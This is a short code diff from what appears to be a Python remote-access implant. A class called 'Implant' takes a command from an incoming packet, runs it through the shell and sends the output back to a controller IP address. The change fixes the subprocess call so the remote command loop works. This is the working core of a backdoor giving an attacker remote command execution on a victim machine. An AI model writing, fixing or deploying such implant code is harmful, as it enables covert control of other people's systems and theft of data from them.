@@ -26,7 +26,7 @@ class Implant(Host):
         try:
             cmd = shellpack['data'].decode()
 
-            output = subprocess.run(cmd, shell=True, stderr=STDOUT, stdout=PIPE, timeout=3, capture_output = True)
+            output = subprocess.run(cmd, shell=True, timeout=3, capture_output = True)
             self.send(self.controller_ip, "instruction", output)
             
         except TimeoutExpired:
